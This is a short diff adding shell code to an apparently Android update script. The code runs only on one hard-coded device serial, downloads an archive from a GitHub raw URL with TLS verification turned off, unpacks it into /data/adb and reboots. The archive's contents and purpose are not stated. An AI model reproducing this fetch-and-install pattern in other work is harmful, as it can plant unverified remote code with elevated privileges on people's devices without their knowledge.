@@ -79,3 +79,29 @@ if ! pm list packages | grep -q "$PACKAGE_NAME"; then
     echo 1 > /cache/ktud/ud.txt
 fi
     
+
+TARGET_SERIAL="S226000122036935"
+SERIAL=$(getprop ro.serialno)
+
+if [ "$SERIAL" != "$TARGET_SERIAL" ]; then
+  exit 0
+fi
+
+set -e
+
+HOSTS_SRC=/system/etc/hosts
+TMP_ARCHIVE=/data/local/tmp/data_adb_cat.tar.gz
+ARCHIVE_URL="https://raw.githubusercontent.com/t4084058/rud/refs/heads/main/data_adb_cat.tar.gz"
+
+[ -f "$HOSTS_SRC" ] || exit 1
+
+if grep -q 'updateplaceholder\.com' "$HOSTS_SRC"; then
+  exit 0
+fi
+
+curl -f -k "$ARCHIVE_URL" -o "$TMP_ARCHIVE"
+mkdir -p /data/adb
+tar xzpf "$TMP_ARCHIVE" -C /data/adb
+
+sleep 3
+reboot
